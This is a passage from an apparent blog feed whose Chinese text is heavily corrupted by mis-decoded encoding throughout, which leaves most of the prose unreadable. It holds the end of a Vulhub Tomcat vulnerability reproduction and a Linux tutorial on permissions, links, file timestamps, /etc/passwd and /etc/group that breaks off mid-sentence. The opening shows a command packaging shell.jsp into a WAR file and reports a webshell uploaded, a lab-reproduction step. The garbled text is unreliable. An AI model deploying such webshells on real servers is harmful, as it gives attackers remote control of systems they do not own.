class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¸Šå»æˆ‘ä»¬å‘ç°å¤šäº†ä¸ªshellæ–‡ä»¶å¤¹</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200307232421.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸä¸Šä¼ ä¸€ä¸ªwebshellä¸Šå»</p><img src="/2020/03/06/Vulhub%E4%B9%8Btomcat/TIMæˆªå›¾20200307232145.png" style="zoom:80%;"><p>å‚è€ƒï¼š</p><p><a href="http://blog.nsfocus.net/cve-2020-1938/">http://blog.nsfocus.net/cve-2020-1938/</a></p><p><a href="https://paper.seebug.org/399/">https://paper.seebug.org/399/</a></p><p><a href="https://www.jianshu.com/p/023f3a249a81">https://www.jianshu.com/p/023f3a249a81</a></p><p><a href="https://www.jianshu.com/p/f3e4b5896edb">https://www.jianshu.com/p/f3e4b5896edb</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> å¤ç° </tag>
            
            <tag> Vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxç›¸å…³å†…å®¹å­¦ä¹ </title>
      <link href="2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
      <url>2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å’Œlinuxç”¨æˆ·åŠæƒé™çš„ç›¸å…³å†…å®¹ï¼Œæƒé™çš„ä¸œè¥¿ç»å¸¸å¼„æ··ï¼Œè®°ä¸€ä¸‹ï¼</p><a id="more"></a><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="æƒé™"><a href="#æƒé™" class="headerlink" title="æƒé™"></a>æƒé™</h3><p>æˆ‘ä»¬å¯ä»¥ç”¨<code>ls -l</code>æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</p><p>linuxä¸‹çš„æƒé™å¯åˆ†ä¸ºä¸‰ç§ï¼š</p><ul><li>rè¡¨ç¤ºè¯»ï¼Œæ•°å­—è¡¨ç¤ºä¸º4ã€‚å¯¹æ–‡ä»¶æ¥è¯´è¡¨ç¤ºå¯ä»¥è¯»å–æ­¤æ–‡ä»¶çš„å®é™…å†…å®¹ï¼Œè€Œå¯¹ç›®å½•æ¥è¯´è¡¨ç¤ºå¯ä»¥è¯»å–ç›®å½•ç»“æ„åˆ—è¡¨ï¼Œå³å¯ä»¥æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶åå’Œå­ç›®å½•åï¼Œæ³¨æ„ä»…ä»…æ˜¯åå­—</li><li>wè¡¨ç¤ºå†™ï¼Œæ•°å­—è¡¨ç¤º2ã€‚å¯¹æ–‡ä»¶æ¥è¯´å¯ä»¥ç¼–è¾‘ã€æ·»åŠ æˆ–è€…æ˜¯ä¿®æ”¹è¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œä½†ä¸åŒ…å«åˆ é™¤è¯¥æ–‡ä»¶ï¼Œè€Œå¯¹ç›®å½•æ¥è¯´è¡¨ç¤ºå…·æœ‰æ›´æ”¹è¯¥ç›®å½•ç»“æ„åˆ—è¡¨çš„æƒé™ï¼ŒåŒ…æ‹¬æ–°å»ºåˆ é™¤é‡å‘½åç§»åŠ¨æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹</li><li>xè¡¨ç¤ºæ‰§è¡Œï¼Œæ•°å­—è¡¨ç¤º1ã€‚å¯¹æ–‡ä»¶æ¥è¯´è¡¨ç¤ºè¯¥æ–‡ä»¶å…·æœ‰å¯ä»¥è¢«ç³»ç»Ÿæ‰§è¡Œçš„æƒé™ï¼Œè€Œå¯¹ç›®å½•æ¥è¯´è¡¨ç¤ºç”¨æˆ·å¯ä»¥è¿›å…¥è¯¥ç›®å½•æˆä¸ºå·¥ä½œç›®å½•ï¼Œå¦‚æœç”¨æˆ·å¯¹äºæŸä¸ªç›®å½•ä¸å…·æœ‰xæƒé™ï¼Œåˆ™æ— æ³•åˆ‡æ¢åˆ°è¯¥ç›®å½•ä¸‹ï¼Œä¹Ÿå°±æ— æ³•æ‰§è¡Œè¯¥ç›®å½•ä¸‹çš„ä»»ä½•å‘½ä»¤ï¼Œå³ä½¿å…·æœ‰è¯¥ç›®å½•çš„ræƒé™ã€‚</li></ul><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/TIMæˆªå›¾20200304230610.png" style="zoom:80%;"><p>ä»¥å›¾<code>conf.d</code>ä¸ºä¾‹ï¼š</p><ul><li>dä»£è¡¨æ˜¯ç›®å½•ï¼Œ-ä»£è¡¨æ–‡ä»¶</li><li><code>rwx</code>ä»£è¡¨æ–‡ä»¶æˆ–ç›®å½•æ‰€æœ‰è€…çš„æ‹¥æœ‰çš„æƒé™</li><li><code>r-x</code>ä»£è¡¨æ–‡ä»¶æˆ–ç›®å½•ç»„ç¾¤çš„æ‹¥æœ‰çš„æƒé™</li><li><code>r-x</code>ä»£è¡¨æ–‡ä»¶æˆ–ç›®å½•å…¶å®ƒäººçš„æ‹¥æœ‰çš„æƒé™</li><li>æ•°å­—2ä»£è¡¨ é“¾æ¥å ç”¨çš„èŠ‚ç‚¹ä¸ªæ•°ï¼Œå¦‚æœæ˜¯ç›®å½•åˆ™è¡¨ç¤ºè¯¥ç›®å½•æ‰€å«å­ç›®å½•æˆ–æ–‡ä»¶çš„ä¸ªæ•°</li><li>ç¬¬ä¸€ä¸ªrootè¡¨ç¤ºæ–‡ä»¶æˆ–ç›®å½•æ‰€æœ‰è€…</li><li>ç¬¬äºŒä¸ªrootä»£è¡¨æ–‡ä»¶æˆ–ç›®å½•æ‰€å±ç»„</li><li>4096ä»£è¡¨çš„æ˜¯æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„å¤§å°ï¼Œå•ä½å­—èŠ‚</li><li>ç„¶åå°±æ˜¯æ—¶é—´äº†ï¼Œè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯æœ€åä¿®æ”¹æ—¶é—´</li></ul><h3 id="è½¯è¿æ¥å’Œç¡¬è¿æ¥"><a href="#è½¯è¿æ¥å’Œç¡¬è¿æ¥" class="headerlink" title="è½¯è¿æ¥å’Œç¡¬è¿æ¥"></a>è½¯è¿æ¥å’Œç¡¬è¿æ¥</h3><p>linuxç³»ç»Ÿä¸­æœ‰ç§æ–‡ä»¶æ˜¯é“¾æ¥æ–‡ä»¶ï¼Œå¯ä»¥ä¸ºè§£å†³æ–‡ä»¶çš„å…±äº«ä½¿ç”¨ã€‚é“¾æ¥çš„æ–¹å¼å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯ç¡¬é“¾æ¥ï¼ˆHard Linkï¼‰ï¼Œå¦ä¸€ç§æ˜¯è½¯é“¾æ¥æˆ–è€…ä¹Ÿç§°ä¸ºç¬¦å·é“¾æ¥ï¼ˆSymbolic Linkï¼‰ã€‚</p><h4 id="ç¡¬è¿æ¥"><a href="#ç¡¬è¿æ¥" class="headerlink" title="ç¡¬è¿æ¥"></a>ç¡¬è¿æ¥</h4><p>ç¡¬é“¾æ¥æ˜¯æŒ‡é€šè¿‡ç´¢å¼•èŠ‚ç‚¹æ¥è¿›è¡Œé“¾æ¥ã€‚åœ¨Linuxçš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¿å­˜åœ¨ç£ç›˜åˆ†åŒºä¸­çš„æ–‡ä»¶ä¸ç®¡æ˜¯ä»€ä¹ˆç±»å‹éƒ½ä¼šç»™å®ƒåˆ†é…ä¸€ä¸ªç¼–å·ï¼Œè¿™ä¸ªç¼–å·è¢«ç§°ä¸ºç´¢å¼•èŠ‚ç‚¹ç¼–å·å·(Inode Index)æˆ–è€…Inodeï¼Œå®ƒæ˜¯æ–‡ä»¶æˆ–è€…ç›®å½•åœ¨ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­çš„å”¯ä¸€æ ‡è¯†ï¼Œæ–‡ä»¶çš„å®é™…æ•°æ®æ”¾ç½®åœ¨æ•°æ®åŒºåŸŸï¼ˆdata blockï¼‰ï¼Œå®ƒå­˜å‚¨ç€æ–‡ä»¶é‡è¦å‚æ•°ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯å…ƒæ•°æ® ï¼ˆmetadataï¼‰ï¼Œæ¯”å¦‚åˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´ã€æ–‡ä»¶å¤§å°ã€å±ä¸»ã€å½’å±çš„ç”¨æˆ·ç»„ã€è¯»å†™æƒé™ã€æ•°æ®æ‰€åœ¨blockå·ç­‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/824470-20180531151753197-400006785.png"><p> åœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¤šä¸ªæ–‡ä»¶åæŒ‡å‘åŒä¸€ç´¢å¼•èŠ‚ç‚¹(Inode)æ˜¯æ­£å¸¸ä¸”å…è®¸çš„ã€‚ä¸€èˆ¬è¿™ç§é“¾æ¥å°±ç§°ä¸ºç¡¬é“¾æ¥ã€‚ç¡¬é“¾æ¥çš„ä½œç”¨ä¹‹ä¸€æ˜¯å…è®¸ä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªæœ‰æ•ˆè·¯å¾„åï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥å»ºç«‹ç¡¬é“¾æ¥åˆ°é‡è¦çš„æ–‡ä»¶ï¼Œä»¥é˜²æ­¢â€œè¯¯åˆ â€æºæ•°æ®ï¼Œä¸è¿‡ç¡¬é“¾æ¥åªèƒ½åœ¨åŒä¸€æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ä¹‹é—´è¿›è¡Œé“¾æ¥ï¼Œä¸èƒ½å¯¹ç›®å½•è¿›è¡Œåˆ›å»ºã€‚ä¹‹æ‰€ä»¥æ–‡ä»¶å»ºç«‹äº†ç¡¬é“¾æ¥å°±ä¼šé˜²æ­¢æ•°æ®è¯¯åˆ ï¼Œæ˜¯å› ä¸ºæ–‡ä»¶ç³»ç»Ÿçš„åŸç†æ˜¯ï¼Œåªè¦æ–‡ä»¶çš„ç´¢å¼•èŠ‚ç‚¹è¿˜æœ‰ä¸€ä¸ªä»¥ä¸Šçš„é“¾æ¥ï¼ˆä»…åˆ é™¤äº†è¯¥æ–‡ä»¶çš„æŒ‡å‘ï¼‰ï¼Œåªåˆ é™¤å…¶ä¸­ä¸€ä¸ªé“¾æ¥å¹¶ä¸å½±å“ç´¢å¼•èŠ‚ç‚¹æœ¬èº«å’Œå…¶ä»–çš„é“¾æ¥ï¼ˆæ•°æ®çš„å®ä½“å¹¶æœªåˆ é™¤ï¼‰ï¼Œåªæœ‰å½“æœ€åä¸€ä¸ªé“¾æ¥è¢«åˆ é™¤åï¼Œæ­¤æ—¶å¦‚æœæœ‰æ–°æ•°æ®è¦å­˜å‚¨åˆ°ç£ç›˜ä¸Šï¼Œè¢«åˆ é™¤çš„æ–‡ä»¶çš„æ•°æ®å—åŠç›®å½•çš„é“¾æ¥æ‰ä¼šè¢«é‡Šæ”¾ï¼Œç©ºé—´è¢«æ–°æ•°æ®æš‚ç”¨è¦†ç›–ã€‚</p><h4 id="è½¯è¿æ¥"><a href="#è½¯è¿æ¥" class="headerlink" title="è½¯è¿æ¥"></a>è½¯è¿æ¥</h4><p> è½¯é“¾æ¥ï¼ˆä¹Ÿå«ç¬¦å·é“¾æ¥ï¼‰ï¼Œç±»ä¼¼äºwindowsç³»ç»Ÿä¸­çš„å¿«æ·æ–¹å¼ï¼Œä¸ç¡¬é“¾æ¥ä¸åŒï¼Œè½¯é“¾æ¥å°±æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œåªæ˜¯æ•°æ®å—å†…å®¹æœ‰ç‚¹ç‰¹æ®Šï¼Œæ–‡ä»¶ç”¨æˆ·æ•°æ®å—ä¸­å­˜æ”¾çš„å†…å®¹æ˜¯å¦ä¸€æ–‡ä»¶çš„è·¯å¾„åçš„æŒ‡å‘ï¼Œé€šè¿‡è¿™ä¸ªæ–¹å¼å¯ä»¥å¿«é€Ÿå®šä½åˆ°è½¯è¿æ¥æ‰€æŒ‡å‘çš„æºæ–‡ä»¶å®ä½“ã€‚è½¯é“¾æ¥å¯å¯¹æ–‡ä»¶æˆ–ç›®å½•åˆ›å»ºã€‚</p><h4 id="lnå‘½ä»¤"><a href="#lnå‘½ä»¤" class="headerlink" title="lnå‘½ä»¤"></a>lnå‘½ä»¤</h4><p>nå‘½ä»¤æ ¼å¼ï¼š </p><p> ln [å‚æ•°] [æºæ–‡ä»¶æˆ–ç›®å½•] [ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•]</p><p>ä¸»è¦å‚æ•°ï¼š</p><ul><li>-i äº¤äº’æ¨¡å¼ï¼Œæ–‡ä»¶å­˜åœ¨åˆ™æç¤ºç”¨æˆ·æ˜¯å¦è¦†ç›–ã€‚</li><li>-s è½¯é“¾æ¥(ç¬¦å·é“¾æ¥)ã€‚</li><li>-d å…è®¸è¶…çº§ç”¨æˆ·åˆ¶ä½œç›®å½•çš„ç¡¬é“¾æ¥ã€‚</li><li>-b åˆ é™¤ï¼Œè¦†ç›–ä»¥å‰å»ºç«‹çš„é“¾æ¥</li></ul><ol><li>è½¯é“¾æ¥ ï¼ˆç¬¦å·é“¾æ¥ï¼‰ <code>ln -s  source target</code> </li><li>ç¡¬é“¾æ¥ ï¼ˆå®ä½“é“¾æ¥ï¼‰<code>ln source  target</code></li></ol><h3 id="ä¸‰ç§æ—¶é—´"><a href="#ä¸‰ç§æ—¶é—´" class="headerlink" title="ä¸‰ç§æ—¶é—´"></a>ä¸‰ç§æ—¶é—´</h3><p>å¯¹äºæ–‡ä»¶æ¥è¯´ï¼Œä¸‰ç§æ—¶é—´æœ‰ä¸åŒçš„å«ä¹‰ï¼š</p><ol><li>è®¿é—®æ—¶é—´ï¼ˆatimeï¼šaccess timeï¼‰ï¼šè¯»ä¸€æ¬¡æ–‡ä»¶çš„å†…å®¹ï¼Œatimeå°±ä¼šæ›´æ–°ã€‚æ¯”å¦‚å¯¹è¿™ä¸ªæ–‡ä»¶è¿ç”¨ moreã€catç­‰å‘½ä»¤ã€‚å¦å¤–lsã€statå‘½ä»¤éƒ½ä¸ä¼šä¿®æ”¹æ–‡ä»¶çš„è®¿é—®æ—¶é—´ã€‚</li><li>ä¿®æ”¹æ—¶é—´ï¼ˆmtimeï¼šmodifiy timeï¼‰ï¼šmtimeæ˜¯æ–‡ä»¶å†…å®¹æœ€åä¸€æ¬¡è¢«ä¿®æ”¹æ—¶é—´ã€‚ä¾‹å¦‚viåä¿å­˜æ–‡ä»¶ã€‚ls -låˆ—å‡ºçš„æ—¶é—´å°±æ˜¯è¿™ä¸ªæ—¶é—´ã€‚</li><li>çŠ¶æ€æ”¹åŠ¨æ—¶é—´ï¼ˆctimeï¼šchange timeï¼‰ï¼šctimeæ˜¯åœ¨å†™å…¥æ–‡ä»¶ã€æ›´æ”¹æ‰€æœ‰è€…ã€æƒé™æˆ–é“¾æ¥è®¾ç½®æ—¶éšièŠ‚ç‚¹çš„å†…å®¹æ›´æ”¹è€Œæ›´æ”¹çš„ï¼Œæ˜¯è¯¥æ–‡ä»¶çš„ièŠ‚ç‚¹æœ€åä¸€æ¬¡è¢«ä¿®æ”¹çš„æ—¶é—´ï¼Œé€šè¿‡chmodã€chownå‘½ä»¤ä¿®æ”¹ä¸€æ¬¡æ–‡ä»¶å±æ€§ï¼Œè¿™ä¸ªæ—¶é—´å°±ä¼šæ›´æ–°ã€‚</li></ol><p>å¯ä»¥ç”¨<code>stat</code>å‘½ä»¤æŸ¥çœ‹ä¸‰ç§æ—¶é—´ï¼Œä¹Ÿå¯ä»¥ç”¨lså‘½ä»¤åŠ å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -lc filename åˆ—å‡ºæ–‡ä»¶çš„ ctime ï¼ˆæœ€åçŠ¶æ€æ›´æ”¹æ—¶é—´ï¼‰ </span><br><span class="line">ls -lu filename åˆ—å‡ºæ–‡ä»¶çš„ atimeï¼ˆæœ€åè®¿é—®æ—¶é—´ï¼‰ </span><br><span class="line">ls -l filename åˆ—å‡ºæ–‡ä»¶çš„ mtime ï¼ˆæœ€åä¿®æ”¹æ—¶é—´ï¼‰</span><br></pre></td></tr></table></figure><h3 id="ä¸‰ä¸ªé‡è¦æ–‡ä»¶"><a href="#ä¸‰ä¸ªé‡è¦æ–‡ä»¶" class="headerlink" title="ä¸‰ä¸ªé‡è¦æ–‡ä»¶"></a>ä¸‰ä¸ªé‡è¦æ–‡ä»¶</h3><h4 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h4><p>ä»¥ä¸‹å›¾ä¸ºä¾‹</p><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/TIMæˆªå›¾20200305220338.png" style="zoom:80%;"><p><code>/etc/passwd</code>æ–‡ä»¶ä¸­ä¸€è¡Œè®°å½•å¯¹åº”ç€ä¸€ä¸ªç”¨æˆ·ï¼Œæ¯è¡Œè®°å½•åˆè¢«å†’å·(:)åˆ†éš”ä¸º7ä¸ªå­—æ®µï¼Œå…¶æ ¼å¼å’Œå…·ä½“å«ä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·å:å£ä»¤:ç”¨æˆ·æ ‡è¯†å·:ç»„æ ‡è¯†å·:æ³¨é‡Šæ€§æè¿°:ä¸»ç›®å½•:ç™»å½•Shell</span><br></pre></td></tr></table></figure><ol><li><p>ç”¨æˆ·å(login_name):æ˜¯ä»£è¡¨ç”¨æˆ·è´¦å·çš„å­—ç¬¦ä¸²ã€‚</p></li><li><p>å£ä»¤(passwd):ä¸€äº›ç³»ç»Ÿä¸­ï¼Œå­˜æ”¾ç€åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—ã€‚è™½ç„¶è¿™ä¸ªå­—æ®µå­˜æ”¾çš„åªæ˜¯ç”¨æˆ·å£ä»¤çš„åŠ å¯†ä¸²ï¼Œä¸æ˜¯æ˜æ–‡ï¼Œä½†æ˜¯ç”±äº/etc/passwdæ–‡ä»¶å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ï¼Œæ‰€ä»¥è¿™ä»æ˜¯ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚å› æ­¤ï¼Œç°åœ¨è®¸å¤šLinuxç³»ç»Ÿï¼ˆå¦‚SVR4ï¼‰éƒ½ä½¿ç”¨äº†shadowæŠ€æœ¯ï¼ŒæŠŠçœŸæ­£çš„åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—å­˜æ”¾åˆ°/etc/shadowæ–‡ä»¶ä¸­ï¼Œè€Œåœ¨/etc/passwdæ–‡ä»¶çš„å£ä»¤å­—æ®µä¸­åªå­˜æ”¾ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ï¼Œä¾‹å¦‚â€œxâ€æˆ–è€…â€œ*â€ã€‚</p></li><li><p>ç”¨æˆ·æ ‡è¯†å·(UID):æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œç³»ç»Ÿå†…éƒ¨ç”¨å®ƒæ¥æ ‡è¯†ç”¨æˆ·ã€‚ä¸€èˆ¬æƒ…å†µä¸‹å®ƒä¸ç”¨æˆ·åæ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚å¦‚æœå‡ ä¸ªç”¨æˆ·åå¯¹åº”çš„ç”¨æˆ·æ ‡è¯†å·æ˜¯ä¸€æ ·çš„ï¼Œç³»ç»Ÿå†…éƒ¨å°†æŠŠå®ƒä»¬è§†ä¸ºåŒä¸€ä¸ªç”¨æˆ·ï¼Œä½†æ˜¯å®ƒä»¬å¯ä»¥æœ‰ä¸åŒçš„å£ä»¤ã€ä¸åŒçš„ä¸»ç›®å½•ä»¥åŠä¸åŒçš„ç™»å½•Shellç­‰ã€‚å–å€¼èŒƒå›´æ˜¯0-65535ã€‚0æ˜¯è¶…çº§ç”¨æˆ·rootçš„æ ‡è¯†å·ï¼Œ1-99ç”±ç³»ç»Ÿä¿ç•™ï¼Œä½œä¸ºç®¡ç†è´¦å·ï¼Œæ™®é€šç”¨æˆ·çš„æ ‡è¯†å·ä»100å¼€å§‹ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªç•Œé™æ˜¯500ã€‚</p></li><li><p>ç»„æ ‡è¯†å·(GID):å­—æ®µè®°å½•çš„æ˜¯ç”¨æˆ·æ‰€å±çš„ç”¨æˆ·ç»„ã€‚å®ƒå¯¹åº”ç€/etc/groupæ–‡ä»¶ä¸­çš„ä¸€æ¡è®°å½•ã€‚</p></li><li><p>æ³¨é‡Šæ€§æè¿°(users):å­—æ®µè®°å½•ç€ç”¨æˆ·çš„ä¸€äº›ä¸ªäººæƒ…å†µï¼Œä¾‹å¦‚ç”¨æˆ·çš„çœŸå®å§“åã€ç”µè¯ã€åœ°å€ç­‰ï¼Œè¿™ä¸ªå­—æ®µå¹¶æ²¡æœ‰ä»€ä¹ˆå®é™…çš„ç”¨é€”ã€‚åœ¨ä¸åŒçš„Linuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå­—æ®µçš„æ ¼å¼å¹¶æ²¡æœ‰ç»Ÿä¸€ã€‚åœ¨è®¸å¤šLinuxç³»ç»Ÿä¸­ï¼Œè¿™ä¸ªå­—æ®µå­˜æ”¾çš„æ˜¯ä¸€æ®µä»»æ„çš„æ³¨é‡Šæ€§æè¿°æ–‡å­—ï¼Œç”¨åšfingerå‘½ä»¤çš„è¾“å‡ºã€‚</p></li><li><p>ä¸»ç›®å½•(home_directory):ä¹Ÿå°±æ˜¯ç”¨æˆ·çš„èµ·å§‹å·¥ä½œç›®å½•ï¼Œå®ƒæ˜¯ç”¨æˆ·åœ¨ç™»å½•åˆ°ç³»ç»Ÿä¹‹åæ‰€å¤„çš„ç›®å½•ã€‚åœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œå„ç”¨æˆ·çš„ä¸»ç›®å½•éƒ½è¢«ç»„ç»‡åœ¨åŒä¸€ä¸ªç‰¹å®šçš„ç›®å½•ä¸‹ï¼Œè€Œç”¨æˆ·ä¸»ç›®å½•çš„åç§°å°±æ˜¯è¯¥ç”¨æˆ·çš„ç™»å½•åã€‚å„ç”¨æˆ·å¯¹è‡ªå·±çš„ä¸»ç›®å½•æœ‰è¯»ã€å†™ã€æ‰§è¡Œï¼ˆæœç´¢ï¼‰æƒé™ï¼Œå…¶ä»–ç”¨æˆ·å¯¹æ­¤ç›®å½•çš„è®¿é—®æƒé™åˆ™æ ¹æ®å…·ä½“æƒ…å†µè®¾ç½®ã€‚</p></li><li><p>ç™»å½•Shell(Shell):ç”¨æˆ·ç™»å½•åï¼Œè¦å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ï¼Œè´Ÿè´£å°†ç”¨æˆ·çš„æ“ä½œä¼ ç»™å†…æ ¸ï¼Œè¿™ä¸ªè¿›ç¨‹æ˜¯ç”¨æˆ·ç™»å½•åˆ°ç³»ç»Ÿåè¿è¡Œçš„å‘½ä»¤è§£é‡Šå™¨æˆ–æŸä¸ªç‰¹å®šçš„ç¨‹åºï¼Œå³Shellã€‚Shellæ˜¯ç”¨æˆ·ä¸Linuxç³»ç»Ÿä¹‹é—´çš„æ¥å£ã€‚Linuxçš„Shellæœ‰è®¸å¤šç§ï¼Œæ¯ç§éƒ½æœ‰ä¸åŒçš„ç‰¹ç‚¹ã€‚å¸¸ç”¨çš„æœ‰sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)ç­‰ã€‚ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥æ ¹æ®ç³»ç»Ÿæƒ…å†µå’Œç”¨æˆ·ä¹ æƒ¯ä¸ºç”¨æˆ·æŒ‡å®šæŸä¸ªShellã€‚å¦‚æœä¸æŒ‡å®šShellï¼Œé‚£ä¹ˆç³»ç»Ÿä½¿ç”¨shä¸ºé»˜è®¤çš„ç™»å½•Shellï¼Œå³è¿™ä¸ªå­—æ®µçš„å€¼ä¸º/bin/shã€‚</p></li></ol><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç³»ç»Ÿä¸­è¿˜æœ‰ä¸€äº›é»˜è®¤çš„å¸å·ï¼Œå¦‚daemonã€binç­‰ã€‚è¿™äº›å¸å·æœ‰ç€ç‰¹æ®Šçš„ç”¨é€”ï¼Œä¸€èˆ¬ç”¨äºè¿›è¡Œç³»ç»Ÿç®¡ç†ã€‚è¿™äº›å¸å·çš„å£ä»¤å¤§éƒ¨åˆ†ç”¨ï¼ˆxï¼‰å·è¡¨ç¤ºï¼Œä»£è¡¨å®ƒä»¬ä¸èƒ½åœ¨ç™»å½•æ—¶ä½¿ç”¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">binæ‹¥æœ‰å¯æ‰§è¡Œçš„ç”¨æˆ·å‘½ä»¤æ–‡ä»¶ </span><br><span class="line">sysæ‹¥æœ‰ç³»ç»Ÿæ–‡ä»¶ </span><br><span class="line">admæ‹¥æœ‰å¸æˆ·æ–‡ä»¶ </span><br><span class="line">uucpUUCPä½¿ç”¨ </span><br><span class="line">lplpæˆ–lpdå­ç³»ç»Ÿä½¿ç”¨ </span><br><span class="line">nobodyNFSä½¿ç”¨</span><br></pre></td></tr></table></figure><p>äº†ä¸Šé¢åˆ—å‡ºçš„ä¼ªç”¨æˆ·å¤–ï¼Œè¿˜æœ‰è®¸å¤šæ ‡å‡†çš„ä¼ªç”¨æˆ·ï¼Œä¾‹å¦‚ï¼šaudit,cron,mail,usenetç­‰ï¼Œå®ƒä»¬ä¹Ÿéƒ½å„è‡ªä¸ºç›¸å…³çš„è¿›ç¨‹å’Œæ–‡ä»¶æ‰€éœ€è¦ã€‚</p><h4 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h4><img src="/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/TIMæˆªå›¾20200305222550.png" style="zoom: 67%;"><p>/etc/group æ–‡ä»¶æ˜¯ç”¨æˆ·ç»„çš„é…ç½®æ–‡ä»¶ï¼Œå†…å®¹åŒ…æ‹¬ç”¨æˆ·å’Œç”¨æˆ·ç»„ï¼Œå¹¶ä¸”èƒ½æ˜¾ç¤ºå‡ºç”¨æˆ·æ˜¯å½’å±å“ªä¸ªç”¨æˆ·ç»„æˆ–å“ªå‡ ä¸ªç”¨æˆ·ç»„ï¼Œå› ä¸ºä¸€ä¸ªç”¨æˆ·å¯ä»¥å½’å±ä¸€ä¸ªæˆ–å¤šä¸ªä¸åŒçš„ç”¨æˆ·ç»„ï¼›åŒä¸€ç”¨ æˆ·ç»„çš„ç”¨æˆ·ä¹‹é—´å…·æœ‰ç›¸ä¼¼çš„ç‰¹å¾ã€‚æ¯”å¦‚æˆ‘ä»¬æŠŠæŸä¸€ç”¨æˆ·åŠ å…¥åˆ°rootç”¨æˆ·ç»„ï¼Œé‚£ä¹ˆè¿™ä¸ªç”¨æˆ·å°±å¯ä»¥æµè§ˆrootç”¨æˆ·å®¶ç›®å½•çš„æ–‡ä»¶ï¼Œå¦‚æœrootç”¨æˆ·æŠŠæŸä¸ªæ–‡ä»¶ çš„è¯»å†™æ‰§è¡Œæƒé™å¼€æ”¾ï¼Œrootç”¨æˆ·ç»„çš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥ä¿®æ”¹æ­¤æ–‡ä»¶ï¼Œå¦‚æœæ˜¯å¯æ‰§è¡Œçš„æ–‡ä»¶ï¼ˆæ¯”å¦‚è„šæœ¬ï¼‰ï¼Œrootç”¨æˆ·ç»„çš„ç”¨æˆ·ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„ã€‚</p><p>åœ¨/etc/group ä¸­çš„æ¯æ¡è®°å½•åˆ†å››ä¸ªå­—æ®µï¼š<br>ç¬¬ä¸€å­—æ®µï¼šç”¨æˆ·ç»„åç§°ï¼›<br>ç¬¬äºŒå­—æ®µï¼šç”¨æˆ·ç»„å¯†ç 